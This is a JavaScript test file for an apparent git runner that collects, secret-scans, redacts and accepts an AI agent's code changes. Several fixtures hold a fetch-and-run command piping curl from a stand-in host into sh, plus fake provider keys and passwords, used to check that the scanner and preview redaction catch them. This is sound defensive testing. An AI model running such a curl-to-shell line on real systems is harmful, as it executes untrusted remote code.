  const f = await collect(w.g, w.collectTask(), { dataRoot: w.dataRoot, patchMaxBytes: 2048 });
  assert.equal(f.scanTruncated, true);
  assert.deepEqual(f.secretHits, [], 'the secret file was past the cut: unseen, hence the flag');
  const w2 = world({ 'a.txt': 'a\n' });
  await ensureWorktree(w2.g, w2.task, { dataRoot: w2.dataRoot });
  fs.writeFileSync(path.join(w2.wt, 'aaa-padding.txt'), 'line of ordinary padding text\n'.repeat(400));
  fs.writeFileSync(path.join(w2.wt, 'zzz-secret.txt'), 'AKIAABCDEFGHIJKLMNOP\n');
  const g = await collect(w2.g, w2.collectTask(), { dataRoot: w2.dataRoot });
  assert.equal(g.scanTruncated, false);
  assert.deepEqual(g.secretHits, [{ path: 'zzz-secret.txt', line: 1, rule: 'provider_key' }]);
});

test('collect never stages the agent tool\'s settings folder, whatever scope main supplied', async () => {
  const w = world({ 'a.txt': 'a\n' });
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  fs.mkdirSync(path.join(w.wt, '.claude'), { recursive: true });
  fs.writeFileSync(path.join(w.wt, '.claude', 'settings.local.json'), '{}\n');
  fs.mkdirSync(path.join(w.wt, 'x', '.claude'), { recursive: true });
  fs.writeFileSync(path.join(w.wt, 'x', '.claude', 'y.txt'), 'y\n');
  fs.writeFileSync(path.join(w.wt, 'a.txt'), 'a2\n');
  for (const scope of [[], ['**']]) {
    const f = await collect(w.g, w.collectTask({ scope }), { dataRoot: w.dataRoot });
    assert.deepEqual(f.paths, ['a.txt'], JSON.stringify(scope));
    assert.equal(git(w.repo, ['ls-tree', '-r', '--name-only', f.head]).stdout.includes('.claude'), false);
  }
});

test('collect with several scope entries stages the entries that match even when another matches nothing (one add per entry); deletions count; all-unmatched stays "nothing changed"', async () => {
  const w = world({ 'a.txt': 'a\n', 'src/x.txt': 'x\n', 'docs/d.md': 'd\n' });
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  fs.writeFileSync(path.join(w.wt, 'src', 'x.txt'), 'x2\n');
  fs.writeFileSync(path.join(w.wt, 'a.txt'), 'out of scope\n');
  // docs/ is untouched (matches tracked files, no change); e2e/ matches nothing at all: the whole call used to fail 128.
  const f = await collect(w.g, w.collectTask({ scope: ['src/**', 'docs/**', 'e2e/**'] }), { dataRoot: w.dataRoot });
  assert.equal(f.changed, true, 'the src change is committed, not silently dropped');
  assert.deepEqual(f.paths, ['src/x.txt']);
  // A deletion in one entry beside an untouched entry and an entry that matches nothing.
  fs.rmSync(path.join(w.wt, 'src', 'x.txt'));
  const g = await collect(w.g, w.collectTask({ scope: ['src/**', 'docs/**', 'e2e/**'] }), { dataRoot: w.dataRoot });
  assert.equal(g.changed, true);
  assert.equal(git(w.repo, ['ls-tree', '-r', '--name-only', g.head]).stdout.includes('src/x.txt'), false, 'the deletion is committed');
  assert.deepEqual(g.diffstat, { files: 1, insertions: 0, deletions: 1 }, 'against the base the file is gone');
  // Every entry unmatched: nothing changes.
  fs.writeFileSync(path.join(w.wt, 'a.txt'), 'edited again\n');
  const h = await collect(w.g, w.collectTask({ scope: ['nothing/**', 'nowhere/**'] }), { dataRoot: w.dataRoot });
  assert.equal(h.changed, false);
  assert.equal(h.head, g.head);
  // The excludes of a scope still apply to every entry.
  fs.writeFileSync(path.join(w.wt, 'docs', 'gen.md'), 'generated\n'); fs.writeFileSync(path.join(w.wt, 'docs', 'keep.md'), 'keep\n');
  const k = await collect(w.g, w.collectTask({ scope: ['docs/**', '!docs/gen.md'] }), { dataRoot: w.dataRoot });
  assert.ok(k.paths.includes('docs/keep.md') && !k.paths.includes('docs/gen.md'), 'the exclude applied');
});

test('collect scans files git would call binary: a NUL byte and a -diff / binary attribute never hide a secret (path:line only)', async () => {
  const w = world({ 'a.txt': 'a\n', '.gitattributes': 'secret.txt -diff\n*.bin binary\n' });
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  fs.writeFileSync(path.join(w.wt, 'zeros.dat'), Buffer.concat([Buffer.from([0, 1, 2, 10]), Buffer.from('AKIAABCDEFGHIJKLMNOP\n')]));
  fs.writeFileSync(path.join(w.wt, 'secret.txt'), 'x\nAKIAABCDEFGHIJKLMNOP\n');
  fs.writeFileSync(path.join(w.wt, 'blob.bin'), 'AKIAABCDEFGHIJKLMNOP\n');
  const f = await collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
  assert.deepEqual(f.secretHits.map((h) => `${h.path}:${h.line}:${h.rule}`).sort(), ['blob.bin:1:provider_key', 'secret.txt:2:provider_key', 'zeros.dat:2:provider_key']);
  assert.equal(f.scanTruncated, false);
  assert.ok(!JSON.stringify(f).includes('AKIA'));
  // A large real binary fills the scan's cap: fail closed (scanTruncated), never a silent pass.
  const w2 = world({ 'a.txt': 'a\n' });
  await ensureWorktree(w2.g, w2.task, { dataRoot: w2.dataRoot });
  fs.writeFileSync(path.join(w2.wt, 'big.bin'), crypto.randomBytes(64 * 1024));
  const g = await collect(w2.g, w2.collectTask(), { dataRoot: w2.dataRoot, patchMaxBytes: 8 * 1024 });
  assert.equal(g.scanTruncated, true);
});

test('collect never stages a settings folder or file of that name in any case', async () => {
  const w = world({ 'a.txt': 'a\n' });
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  fs.mkdirSync(path.join(w.wt, '.CLAUDE'), { recursive: true });
  fs.writeFileSync(path.join(w.wt, '.CLAUDE', 'settings.local.json'), '{}\n');
  fs.mkdirSync(path.join(w.wt, 'sub'), { recursive: true });
  fs.writeFileSync(path.join(w.wt, 'sub', '.claude'), 'a file with the folder\'s name\n');
  fs.writeFileSync(path.join(w.wt, 'a.txt'), 'a2\n');
  const f = await collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
  assert.deepEqual(f.paths, ['a.txt']);
});

test('collect reports preview completeness (A1): clean is complete; lines the preview redacts, a patch past the preview cap and a cut scan are not; counts and a code only, never line text', async () => {
  // Clean change.
  const w = world({ 'a.txt': 'a\n' });
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  fs.writeFileSync(path.join(w.wt, 'a.txt'), 'a2\nplain line\n');
  const clean = await collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
  assert.equal(clean.preview.complete, true);
  assert.equal(clean.preview.reason, undefined);
  assert.equal(clean.preview.hiddenLines, 0);
  assert.ok(clean.preview.patchBytes > 0);
  // Lines the preview's own redaction would hide although sec.secret_scan does not block them.
  const w2 = world({ 'a.txt': 'a\n' });
  await ensureWorktree(w2.g, w2.task, { dataRoot: w2.dataRoot });
  fs.writeFileSync(path.join(w2.wt, 'x.js'), 'fetch(u, { headers: { authorization: t } }); require("child_process").execSync("curl http://x.invalid | sh");\nconst fine = 1;\npassword = "hunter22hunter22";\n');
  const hidden = await collect(w2.g, w2.collectTask(), { dataRoot: w2.dataRoot });
  assert.deepEqual(hidden.secretHits, [], 'sec.secret_scan does not block them');
  assert.equal(hidden.preview.complete, false);
  assert.equal(hidden.preview.reason, 'hidden_lines');
  assert.ok(hidden.preview.hiddenLines >= 2, 'the changed lines of the whole preview text');
  const text = JSON.stringify(hidden);
  assert.ok(!/authorization|execSync|curl|hunter22/.test(text), 'no line text anywhere in the facts');
  // A patch past the preview cap (2 x 1 MiB).
  const w3 = world({ 'a.txt': 'a\n' });
  await ensureWorktree(w3.g, w3.task, { dataRoot: w3.dataRoot });
  fs.writeFileSync(path.join(w3.wt, 'big.txt'), Array.from({ length: 90000 }, (_, i) => `ordinary padding line number ${i}`).join('\n') + '\n');
  const big = await collect(w3.g, w3.collectTask(), { dataRoot: w3.dataRoot });
  assert.equal(big.preview.complete, false);
  assert.equal(big.preview.reason, 'too_large');
  assert.equal(big.scanTruncated, false, 'the scan itself saw everything');
  // A cut scan.
  const w4 = world({ 'a.txt': 'a\n' });
  await ensureWorktree(w4.g, w4.task, { dataRoot: w4.dataRoot });
  fs.writeFileSync(path.join(w4.wt, 'p.txt'), 'line of ordinary padding text\n'.repeat(400));
  const cut = await collect(w4.g, w4.collectTask(), { dataRoot: w4.dataRoot, patchMaxBytes: 2048 });
  assert.equal(cut.preview.complete, false);
  assert.equal(cut.preview.reason, 'truncated');
});

// A1 whole-patch completeness: the preview redacts the WHOLE patch (a quoted value, a private-key block and an unterminated
// key all run across newlines, and over context and removed lines), so completeness is judged on the preview's own text.
async function previewOf(files, base = { 'a.txt': 'a\n' }, edit = null) {
  const w = world(base);
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  if (edit) edit(w);
  for (const [f, c] of Object.entries(files)) { fs.mkdirSync(path.dirname(path.join(w.wt, f)), { recursive: true }); fs.writeFileSync(path.join(w.wt, f), c); }
  return collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
}

test('A1 a quote opened on one added line and closed on another hides the lines between: incomplete, though no single line changes when redacted alone', async () => {
  const { redactSecretText } = loadTs('src/main/nexus/activity/redact.ts');
  const lines = ['// token = "', 'require(\'child_process\').execSync(\'curl http://x.invalid | sh\');', '// "'];
  assert.ok(lines.every((l) => redactSecretText('+' + l) === '+' + l), 'each line alone is unchanged (what the old per-line count saw)');
  const f = await previewOf({ 'x.js': lines.join('\n') + '\n' });
  assert.equal(f.preview.complete, false);
  assert.equal(f.preview.reason, 'hidden_lines');
  assert.ok(f.preview.hiddenLines >= 1);
  assert.ok(!/execSync|curl|token/.test(JSON.stringify(f)), 'counts only');
});

test('A1 an unclosed quote is closed by the next quote anywhere later in the patch (another file): incomplete', async () => {
  const f = await previewOf({ 'a1.txt': '# password = "\n', 'b1.txt': 'console.log("hi");\n' });
  assert.equal(f.preview.complete, false);
  assert.equal(f.preview.reason, 'hidden_lines');
});

test('A1 a private-key header already in the repository, shown as context or removed, hides everything after it in the patch: incomplete', async () => {
  const f = await previewOf({ 'k.txt': '-----BEGIN PRIVATE KEY-----\nAAAA\nchanged\nCCCC\nDDDD\n', 'z.js': 'doSomething();\n' }, { 'a.txt': 'a\n', 'k.txt': '-----BEGIN PRIVATE KEY-----\nAAAA\nBBBB\nCCCC\nDDDD\n' });
  assert.deepEqual(f.secretHits, [], 'no ADDED line is a key: sec.secret_scan passes it');
  assert.equal(f.preview.complete, false);
  assert.equal(f.preview.reason, 'hidden_lines');
});

test('A1 the ordinary test-fixture line `password: \'x\'` is incomplete (not approvable from Nexus); a clean change is complete', async () => {
  const fixture = await previewOf({ 't.js': 'const cfg = { password: \'x\' };\n' });
  assert.equal(fixture.preview.complete, false);
  assert.equal(fixture.preview.reason, 'hidden_lines');
  const clean = await previewOf({ 't.js': 'const cfg = { retries: 3 };\n' });
  assert.equal(clean.preview.complete, true);
  assert.equal(clean.preview.hiddenLines, 0);
});

test('A1 a file git shows only as "Binary files differ" (a NUL byte) makes the preview incomplete (binary_file); the same text without the NUL is complete', async () => {
  const withNul = await previewOf({ 'src/x.js': Buffer.concat([Buffer.from('const a = 1; // '), Buffer.from([0]), Buffer.from(' x\nrequire(\'./a\');\n')]) });
  assert.equal(withNul.preview.complete, false);
  assert.equal(withNul.preview.reason, 'binary_file');
  assert.deepEqual(withNul.secretHits, []);
  const plain = await previewOf({ 'src/x.js': 'const a = 1; //  x\nrequire(\'./a\');\n' });
  assert.equal(plain.preview.complete, true);
  assert.equal(plain.preview.reason, undefined);
});

test('previewText is the one transform (redaction, then only LONE surrogates replaced: a valid astral character stays whole)', () => {
  const { previewText, PREVIEW_DIFF_ARGS } = GW;
  const emoji = String.fromCodePoint(0x1f600);
  assert.equal(previewText('a ' + emoji + ' b'), 'a ' + emoji + ' b');
  assert.equal(previewText('x' + String.fromCharCode(0xd800) + 'y'), 'x' + String.fromCharCode(0xfffd) + 'y');
  assert.deepEqual([...PREVIEW_DIFF_ARGS], ['diff', '--no-ext-diff', '--no-textconv', '--ignore-submodules=all', '--no-color', '--no-renames']);
  const readSrc = fs.readFileSync(path.join(__dirname, '..', 'src', 'runner', 'gitRead.ts'), 'utf8');
  assert.match(readSrc, /\.\.\.PREVIEW_DIFF_ARGS, task\.base, task\.head/, 'gitRead runs exactly the argv collect judges');
  assert.match(readSrc, /previewText\(raw\.toString\('utf8'\)\)/, 'and the transform collect judges');
});

test('CS14 after the first change set is accepted, the next collect\'s base is the merge-base with the integration ref and its diffstat shows only the new work', async () => {
  const w = world();
  const c1 = await changed(w);
  const old = refOf(w.repo, 'refs/nexus/accepted/main');
  assert.equal(c1.base, old);
  const a = await accept(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', expectedOld: old, head: c1.head,
    message: 'Accept\n\nNexus-Accepted-By: user:local\n' }, { onPrepared: () => {} });
  fs.writeFileSync(path.join(w.wt, 'b.txt'), 'new work\n');
  const c2 = await collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
  assert.equal(refOf(w.repo, 'refs/nexus/accepted/main'), a.new);
  assert.equal(c2.base, c1.head, 'the merge-base of the moved integration ref and the new head');
  assert.notEqual(c2.base, c1.base);
  assert.deepEqual(c2.paths, ['b.txt']);
  assert.deepEqual(c2.diffstat, { files: 1, insertions: 1, deletions: 0 }, 'only the new work, not the accepted one');
});


async function changed(w, content = 'changed\n') {
  await ensureWorktree(w.g, w.task, { dataRoot: w.dataRoot });
  fs.writeFileSync(path.join(w.wt, 'a.txt'), content);
  return collect(w.g, w.collectTask(), { dataRoot: w.dataRoot });
}

test('merge check and accept: merge-tree onto the integration head, accept.prepared reported BEFORE the CAS update-ref, a moved ref answers ref_moved; rollback by CAS', async () => {
  const w = world();
  const c = await changed(w);
  const old = refOf(w.repo, 'refs/nexus/accepted/main');
  const mc = await mergeCheck(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', head: c.head });
  assert.equal(mc.clean, true); assert.equal(mc.integrationHead, old);
  assert.equal(refOf(w.repo, 'refs/nexus/accepted/main'), old, 'a merge check writes no ref');
  await failsWith(accept(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', expectedOld: c.head, head: c.head, message: 'Accept\n' },
    { onPrepared: () => assert.fail('never prepared') }), 'ref_moved');
  const seen = [];
  const before = userState(w.repo);
  const a = await accept(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', expectedOld: old, head: c.head,
    message: 'Accept the agent\'s change\n\nNexus-Accepted-By: user:local\n' },
  { onPrepared: (p) => { seen.push({ ...p, refThen: refOf(w.repo, 'refs/nexus/accepted/main') }); } });
  assert.deepEqual(seen, [{ old, new: a.new, refThen: old }], 'prepared before the move');
  assert.equal(refOf(w.repo, 'refs/nexus/accepted/main'), a.new);
  assert.equal(out(w.repo, ['log', '-1', '--format=%an <%ae>|%P', a.new]), `Nexus <agent@nexus.invalid>|${old} ${c.head}`);
  assert.match(out(w.repo, ['log', '-1', '--format=%B', a.new]), /Nexus-Accepted-By: user:local$/);
  assert.deepEqual(userState(w.repo), before, 'accept never touches the user\'s branch, index or files');
  // Rollback: back by CAS; again is already done; from a third head it refuses.
  const r1 = await rollback(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', from: a.new, to: old });
  assert.deepEqual(r1, { ok: true, from: a.new, to: old, already: false });
  assert.equal(refOf(w.repo, 'refs/nexus/accepted/main'), old);
  assert.equal((await rollback(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', from: a.new, to: old })).already, true);
  await failsWith(rollback(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', from: c.head, to: a.new }), 'ref_moved');
});

test('repo.ff refuses a dirty tree, another branch and a non-fast-forward without changing anything, then fast-forwards to the confirmed commit', async () => {
  const w = world();
  const c = await changed(w, 'merged\n');
  const old = refOf(w.repo, 'refs/nexus/accepted/main');
  const a = await accept(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', expectedOld: old, head: c.head, message: 'Accept\n' }, { onPrepared: () => {} });
  const ff = (o = {}) => fastForward(w.g, { repoPath: w.repo, branch: 'main', sha: a.new, ...o });
  fs.writeFileSync(path.join(w.repo, 'a.txt'), 'dirty\n');
  const dirty = userState(w.repo);
  await failsWith(ff(), 'tree_dirty');
  assert.deepEqual(userState(w.repo), dirty);
  git(w.repo, ['checkout', '-q', '--', 'a.txt']);
  git(w.repo, ['switch', '-q', '-c', 'other']);
  await failsWith(ff(), 'branch_mismatch');
  git(w.repo, ['switch', '-q', 'main']);
  await failsWith(ff({ sha: 'f'.repeat(40) }), 'unknown_commit');
  const st = await gitRead(w.g, { read: 'status', repoPath: w.repo, branch: 'main', integrationRef: 'refs/nexus/accepted/main' });
  assert.deepEqual(st, { ok: true, read: 'status', branch: 'main', head: old, dirty: false, integrationHead: a.new, acceptedNotMerged: 2, fastForward: true });
  const r = await ff();
  assert.deepEqual(r, { ok: true, before: old, after: a.new, branch: 'main' });
  assert.equal(fs.readFileSync(path.join(w.repo, 'a.txt'), 'utf8'), 'merged\n');
  assert.equal(out(w.repo, ['symbolic-ref', 'HEAD']), 'refs/heads/main');
  // The branch moved on by itself: no longer a fast-forward.
  fs.writeFileSync(path.join(w.repo, 'z.txt'), 'z\n'); git(w.repo, ['add', 'z.txt']); git(w.repo, ['commit', '-q', '-m', 'user work']);
  const c2 = await (async () => { fs.writeFileSync(path.join(w.wt, 'a.txt'), 'again\n'); return collect(w.g, w.collectTask(), { dataRoot: w.dataRoot }); })();
  const a2 = await accept(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', expectedOld: a.new, head: c2.head, message: 'Accept\n' }, { onPrepared: () => {} });
  const userHead = out(w.repo, ['rev-parse', 'HEAD']);
  await failsWith(fastForward(w.g, { repoPath: w.repo, branch: 'main', sha: a2.new }), 'not_fast_forward');
  assert.equal(out(w.repo, ['rev-parse', 'HEAD']), userHead);
});

test('repo.ff and git reads never force the EOL config on the user\'s own repository: a CRLF checkout under the user\'s own core.autocrlf=true reads and fast-forwards clean', async () => {
  const w = world();
  // The user's own repository config, not Nexus's: autocrlf=true, as a common Windows default. Re-checked-out through
  // git itself (not a raw byte write) so the index's own stat cache agrees, exactly like a real long-lived checkout
  // under this setting.
  git(w.repo, ['config', 'core.autocrlf', 'true']);
  fs.rmSync(path.join(w.repo, 'a.txt'));
  // Plain git, not the `git()` helper (which always forces -c core.autocrlf=false for its own setup calls): this
  // checkout must run under the repo's own just-set autocrlf=true to reproduce a real CRLF checkout.
  assert.equal(cp.spawnSync('git', ['checkout', '-q', '--', 'a.txt'], { cwd: w.repo }).status, 0);
  assert.equal(fs.readFileSync(path.join(w.repo, 'a.txt'), 'utf8'), 'a\r\n', 'the user\'s own autocrlf=true checked this out with CRLF');
  const untouched = await gitRead(w.g, { read: 'status', repoPath: w.repo, branch: 'main', integrationRef: 'refs/nexus/accepted/main' });
  assert.equal(untouched.ok, true);
  assert.equal(untouched.dirty, false, 'a CRLF file under the repo\'s own autocrlf=true is not forced to look modified');
  const c = await changed(w, 'merged\n');
  const old = refOf(w.repo, 'refs/nexus/accepted/main');
  const a = await accept(w.g, { repoPath: w.repo, integrationRef: 'refs/nexus/accepted/main', expectedOld: old, head: c.head, message: 'Accept\n' }, { onPrepared: () => {} });
  const st = await gitRead(w.g, { read: 'status', repoPath: w.repo, branch: 'main', integrationRef: 'refs/nexus/accepted/main' });
  assert.equal(st.dirty, false, 'still clean with an accepted-but-unmerged commit waiting');
  const r = await fastForward(w.g, { repoPath: w.repo, branch: 'main', sha: a.new });
  assert.deepEqual(r, { ok: true, before: old, after: a.new, branch: 'main' }, 'the CRLF file never caused a spurious tree_dirty refusal');
  // The committed blob is LF ('merged\n'); checked out under the repo's own autocrlf=true it becomes CRLF on disk —
  // the user's own setting governs the checkout, not an LF override forced by Nexus.
  assert.equal(fs.readFileSync(path.join(w.repo, 'a.txt'), 'utf8'), 'merged\r\n', 'the user\'s own autocrlf=true governs the checkout, not a forced LF');
});

test('git reads: status and a bounded, redacted diff between recorded commits; unknown commits and non-repositories answer codes', async () => {
  const w = world();
  const key = 'AKIA' + 'Z7QXJ4KD2M9P3LTV';
  const c = await changed(w, `line\naws = ${key}\n`);
  const d = await gitRead(w.g, { read: 'diff', repoPath: w.repo, base: c.base, head: c.head, maxBytesPerSide: 1_048_576 });
  assert.equal(d.ok, true); assert.equal(d.truncated, false);
  assert.match(d.patch, /\+line/); assert.ok(!d.patch.includes(key), 'redacted');
  assert.ok(parseRunnerMessage({ op: 'git.read.result', reqId: 'r1', result: d }), 'the result passes the protocol');
  assert.deepEqual(await gitRead(w.g, { read: 'diff', repoPath: w.repo, base: c.base, head: 'e'.repeat(40), maxBytesPerSide: 1_048_576 }),
    { ok: false, code: 'unknown_ref', message: 'a recorded commit is not in the repository' });
  const notRepo = tmp('nx-norepo-');
  assert.equal((await gitRead(w.g, { read: 'status', repoPath: notRepo, branch: 'main', integrationRef: 'refs/nexus/accepted/main' })).code, 'not_a_repository');
  assert.equal((await gitRead(w.g, { read: 'diff', repoPath: w.repo, base: c.base, head: c.head, maxBytesPerSide: 5 })).code, 'error');
  const missing = new HardenedGit({ cwd: w.home, resolve: async () => null });
  assert.equal((await gitRead(missing, { read: 'status', repoPath: w.repo, branch: 'main', integrationRef: 'refs/nexus/accepted/main' })).code, 'git_missing');
});

// ---------- the runner core ----------

async function coreWorld() {
  const dir = tmp('nx-gwcore-');
  const home = path.join(dir, 'nexus');
  for (const d of ['objects/tmp', 'logs/jobs', 'logs/images', 'work']) fs.mkdirSync(path.join(home, d), { recursive: true });
  const { port1, port2 } = new MessageChannel();
  const got = [];
  port1.on('message', (m) => got.push(m));
  const core = new RunnerCore(port2, { driver: new FakeSandboxDriver({}), now: () => Date.now(), fs: fsp, log: () => {}, freeBytes: async () => 100 * 2 ** 30,
    sleep: async () => {} });
  const boot = newId(Date.now());
  port1.postMessage({ op: 'hello', bootId: boot, dataHome: home, home: homeLabel(home), profiles: [] });
  const until = async (pred, what) => { const t0 = Date.now(); while (!pred()) { if (Date.now() - t0 > 30_000) throw new Error(`timed out: ${what}`); await new Promise((r) => setTimeout(r, 5)); } };
  await until(() => got.some((m) => m.op === 'ready'), 'ready');
  // The runner starts a loopback MCP server at hello (Task 6); shutdown() closes it, or its listening socket keeps the process alive.
  const close = async () => { try { await core.shutdown(); } catch { /* best effort */ } try { port1.close(); } catch { /* closed */ } };
  MADE.push(dir);
  return { dir, home, core, got, boot, send: (m) => port1.postMessage(m), until, close };
}

function enginePlan(c, recipe, params, repoPath) {
  const jobId = newId(Date.now()); const attemptId = newId(Date.now());
  return buildPlan({ job: { id: jobId, projectId: 'p' }, attempt: { id: attemptId, n: 1 }, bootId: c.boot, recipe: getRecipe(recipe), dataHomeRoot: c.home,
    workRel: `work/${jobId}/1`, logRel: `logs/jobs/${jobId}/1.log`, inputs: [], repoPath, params });
}

test('the runner core runs a planned repo.worktree job (git-facts at exit 0), reports a refusal as a fact code at exit 1, refuses a worktree outside its data home, and answers git.read', async () => {
  const c = await coreWorld();
  try {
    const w = world();
    const plan = enginePlan(c, 'repo.worktree', { sessionId: w.sid, branch: 'main' }, w.repo);
    assert.equal(plan.task.worktreePath, path.join(c.home, 'wt', w.name), 'the session id lowercased');
    assert.equal(plan.task.ref, `refs/nexus/job/${w.name}`);
    c.send({ op: 'attempt.start', attemptId: plan.attemptId, plan });
    await c.until(() => c.got.some((m) => m.op === 'attempt.exited' && m.attemptId === plan.attemptId), 'exited');
    const e = c.got.find((m) => m.op === 'attempt.exited' && m.attemptId === plan.attemptId);
    assert.equal(e.exit.code, 0);
    assert.equal(e.parsed[0].parser, 'git-facts');
    assert.equal(e.parsed[0].normalized.worktree, `wt/${w.name}`); assert.equal(e.parsed[0].normalized.locked, true);
    assert.ok(fs.existsSync(path.join(c.home, 'wt', w.name, 'a.txt')));
    assert.doesNotMatch(JSON.stringify(e), new RegExp(w.repo.replace(/\\/g, '\\\\\\\\')), 'no host path in the exit');
    // A refusal: an empty repository.
    const empty = world({});
    const p2 = enginePlan(c, 'repo.worktree', { sessionId: empty.sid, branch: 'main' }, empty.repo);
    c.send({ op: 'attempt.start', attemptId: p2.attemptId, plan: p2 });
    await c.until(() => c.got.some((m) => m.op === 'attempt.exited' && m.attemptId === p2.attemptId), 'exited 2');
    const e2 = c.got.find((m) => m.op === 'attempt.exited' && m.attemptId === p2.attemptId);
    assert.equal(e2.exit.code, 1); assert.deepEqual(e2.parsed[0].normalized, { ok: false, code: 'repo_empty' });
    // A worktree path that is not this data home's session folder: refused before anything runs.
    const p3 = enginePlan(c, 'repo.worktree', { sessionId: w.sid, branch: 'main' }, w.repo);
    p3.task.worktreePath = path.join(c.dir, 'elsewhere', w.name);
    c.send({ op: 'attempt.start', attemptId: p3.attemptId, plan: p3 });
    await c.until(() => c.got.some((m) => m.op === 'attempt.refused' && m.attemptId === p3.attemptId), 'refused');
    assert.equal(c.got.find((m) => m.op === 'attempt.refused' && m.attemptId === p3.attemptId).reason, 'bad_plan');
    // git.read
    c.send({ op: 'git.read', reqId: 'req-1', task: { read: 'status', repoPath: w.repo, branch: 'main', integrationRef: 'refs/nexus/accepted/main' } });
    await c.until(() => c.got.some((m) => m.op === 'git.read.result' && m.reqId === 'req-1'), 'git.read.result');
    const r = c.got.find((m) => m.op === 'git.read.result');
    assert.equal(r.result.ok, true); assert.equal(r.result.branch, 'main'); assert.equal(r.result.acceptedNotMerged, 0);
  } finally { await c.close(); }
});
